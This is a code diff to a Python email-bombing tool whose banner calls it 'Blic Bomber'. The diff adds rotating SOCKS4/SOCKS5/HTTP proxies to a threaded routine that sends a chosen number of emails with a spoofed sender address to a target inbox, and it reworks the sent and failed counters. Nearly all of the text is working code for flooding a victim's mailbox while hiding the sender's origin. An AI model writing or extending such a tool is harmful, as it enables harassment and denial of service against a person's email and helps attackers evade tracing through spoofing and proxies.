@@ -1,16 +1,19 @@
 import shutil
 import ctypes
 import random
+import socket
+import socks
 import time
 import os
 
 import fade
 from rich.console import *
+from rich.progress import Progress
 from colorama import *
 
 import inquirer
 from questions import questions
-from proxies import proxies
+from proxies import get_proxies
 
 import json
 from email.mime.multipart import MIMEMultipart
@@ -73,6 +76,8 @@ class Bomber:
         self.target = self.answers["target"]
         self.amount = self.answers["amount"]
         self.delay = self.answers["delay"]
+        self.use_proxies = self.answers["proxies"]
+        self.available_proxies = get_proxies()
 
     def clear(self) -> None:
         os.system("cls" if os.name == "nt" else "clear")
@@ -80,7 +85,7 @@ class Bomber:
     def cool_graphics(self) -> None:
         self.clear()
         try:
-            kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if proxies() else 'None'}   |   Python Version: {platform.python_version()}")
+            kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if self.available_proxies else 'None'}   |   Python Version: {platform.python_version()}")
         except:
             pass
         print(fade.purplepink(self.cBanner))
@@ -125,12 +130,35 @@ class Bomber:
             smtp_username = user_data['user']
             smtp_password = user_data['password']
 
-            server = smtplib.SMTP(smtp_host, smtp_port)
-            server.starttls()
-            server.login(smtp_username, smtp_password)
-            text = msg.as_string()
-            server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
-            server.quit()
+            if self.use_proxies == "yes":
+                proxy = random.choice(self.available_proxies)
+                proxy_ip = proxy.split(":")[0]
+                proxy_port = int(proxy.split(":")[1])
+
+                for proxy_type in [socks.SOCKS5, socks.SOCKS4, socks.HTTP]:
+                    try:
+                        with smtplib.SMTP(smtp_host, smtp_port) as server:
+                            server.sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+                            server.sock.set_proxy(proxy_type, proxy_ip, proxy_port)
+                            server.starttls()
+                            server.login(smtp_username, smtp_password)
+                            text = msg.as_string()
+                            server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
+                            Stats.sent += 1
+                            break
+                    except:
+                        Stats.failed += 1
+
+            else:
+                try:
+                    with smtplib.SMTP(smtp_host, smtp_port) as server:
+                        server.starttls()
+                        server.login(smtp_username, smtp_password)
+                        text = msg.as_string()
+                        server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
+                        Stats.sent += 1
+                except:
+                    Stats.failed += 1
 
         except Exception as e:
             print(f"Error: {e}")
@@ -139,9 +167,7 @@ class Bomber:
         for _ in range(int(self.amount)):
             try:
                 threading.Thread(target=self.bomb).start()
-            except Exception as e:
-                Stats.failed += 1
-                print(e)
+            except:
+                pass
 
             time.sleep(int(self.delay))
-            Stats.sent += 1  
